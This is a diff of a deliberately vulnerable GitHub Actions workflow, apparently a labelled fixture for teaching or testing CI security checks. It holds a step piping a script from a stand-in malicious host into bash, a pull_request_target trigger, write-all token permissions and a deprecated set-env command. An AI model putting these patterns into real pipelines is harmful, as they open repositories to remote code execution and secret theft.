@@ -1,11 +1,15 @@
 name: "Vulnerable CI/CD Pipeline"
-on: [issues]
+
+# VULNERABILITY 5: Dangerous Trigger
+on: [pull_request_target]
 
 # VULNERABILITY 3: Overly Permissive Global Tokens
 permissions: write-all
 
 jobs:
   build:
+    # VULNERABILITY 6: Missing timeout-minutes (can run for 6 hours!)
+    
     # VULNERABILITY 3b: Dangerous Job-level Permissions
     permissions:
       contents: write
@@ -27,6 +31,11 @@ jobs:
         run: |
           curl -sL https://malicious.com/install.sh | bash
           
+      # VULNERABILITY 7: Deprecated set-env command
+      - name: Set Environment Variable
+        run: |
+          echo "::set-env name=MY_VAR::my_value"
+
       # SECURE EXAMPLE: Pinned by hash
       - name: Setup Node
         uses: actions/setup-node@60edb5dd545a775178f525247833159c03af0c39
